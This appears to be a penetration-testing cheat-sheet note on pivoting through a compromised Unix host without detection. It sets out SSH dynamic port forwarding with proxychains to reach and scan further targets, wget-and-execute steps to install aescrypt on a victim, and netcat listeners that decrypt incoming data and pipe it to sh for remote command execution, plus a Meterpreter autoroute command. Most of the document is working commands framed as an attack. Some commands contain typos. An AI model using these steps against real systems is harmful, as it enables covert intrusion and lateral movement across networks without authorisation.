# pivoting

This focuses on pivoting undected (or at least, if you are detected, not much info can be derived from the traffic).

## tools

- [sshproxy](https://github.com/montysecurity/sshproxy)
- [cryptshell](https://github.com/montysecurity/cryptshell)

## ssh dynamic ports (scenario)

There are 3 boxes in the network, all \*nix machines. One is your attack box, the second is a box you have pwned and the third is a box you want to pwn, but you are at a delima. How do you route your traffic from the attack box, through the pwned box, to the target box?

You will need proxychains installed on the attack box and a working ssh account on the pwned box.

	On Pwned Box
		ssh -D 0.0.0.0:1337 user@localhost
	
	On Attack Box
		ssh -Nnt -D 0.0.0.0:1337 user@pwnedbox
		enter the password
		wait for the connection to establish, nothing prints to STDOUT or STDERR
		press CTRL+Z, this puts the connection in the background, you should be back at the attack box terminal
		verify the connection is still there: netstat -pan | grep 1337
		add the following line to the end of /etc/proxychains.conf: socks4 pwnedbox 1337
		prepend tool commmands with "proxychains ", in this case, proxychains nmap targetbox

### what this is actually doing...

Whenever you run the first ssh command, you are setting up a listener on pwnedbox:1337 using the "user" account, so if a ssh key is involved, remember to use -i. Pushing it to the background is so you can now have access to your tools on the attack box again. When you edit the proxychains file, you are telling the system, "any traffic ran with proxychains activated is to be forced through pwnedbox:1337 (travelling either way)". Then prepending proxychains to the commands is simply invoking the proxy

### diagrams are nice

- Attack Box --> [proxychains] --> [ssh bind on pwnedbox] --> targetbox
- Attack Box <-- [proxychains] <-- [ssh bind on pwnedbox] <-- targetbox

## aescrypt

You can encrypt commands with aescrypt pre-transit, it is easiest to do it with aescrypt and then decrypt them once they get to the traget and pipe to shell. Aescrypt commands can be swapped out with "base64" and "base64 -d" respectively if the target does not have aescrypt but this is encoding and not encryption - it is a quick and easy solution and should only be used to properly transmit the cipher text, not evading detection.

### if target does not have aescrypt

If the target does not have aescrypt, the following are shell commands to get it installed on \*nix machines

#### 32 bit

	wget https://www.aescrypt.com/download/v3/linux/AESCrypt-GUI-3.11-Linux-x86-Install.gz 
	gunzip AESCrypt-GUI-3.11-Linux-x86-Install.gz
	chmod +x AESCrypt-GUI-3.11-Linux-x86-Install 
	./AESCrypt-GUI-3.11-Linux-x86-Install
	rm AESCrypt-GUI-3.11-Linux-x86-Install

#### 64 bit
	
	wget https://www.aescrypt.com/download/v3/linux/AESCrypt-GUI-3.11-Linux-x86_64-Install.gz 
	gunzip AESCrypt-GUI-3.11-Linux-x86_64-Install.gz 
	chmod +x AESCrypt-GUI-3.11-Linux-x86_64-Install 
	./AESCrypt-GUI-3.11-Linux-x86_64-Install
	rm AESCrypt-GUI-3.11-Linux-x86_64-Install

### transfering shell commands via aescrypt

	On Target Box
		nc -lnvp targetPort > aescrypt.key
	On Attack Box
                aescrypt_keygen -g 64 aescrypt.key && nc targetBox targetPort < aescrypt.kkey
	On Target Box
		nc -lnvp targetPort | aescrypt -d -k aescrypt.key - | sh
	On Attack Box
		echo "bash commands" | aescrypt -e -k aescrypt.key - | nc targetBox tagetPort

## meterpreter

run post/multi/manage/autoroute
